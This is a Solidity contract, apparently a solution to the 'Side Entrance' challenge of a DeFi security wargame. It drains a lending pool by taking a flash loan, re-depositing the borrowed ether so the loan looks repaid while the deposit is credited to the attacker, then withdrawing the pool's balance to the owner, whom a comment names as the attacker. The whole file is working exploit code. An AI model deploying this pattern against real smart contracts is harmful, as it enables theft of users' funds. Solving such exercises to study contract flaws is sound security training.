// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {   
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(SideEntranceLenderPool _pool){
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function executeFlashLoan(uint256 _amount) public payable{
        require(owner == msg.sender);
        pool.flashLoan(_amount);
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    function withdraw() external returns (bool) {
        require(owner == msg.sender);

        // Withdraw from pool's balance to this contract
        pool.withdraw();

        // Send from this contract to owner (attacker)
        (bool success, ) = owner.call{value: address(this).balance}("");
        return success;
    }

    receive() external payable{

    }

}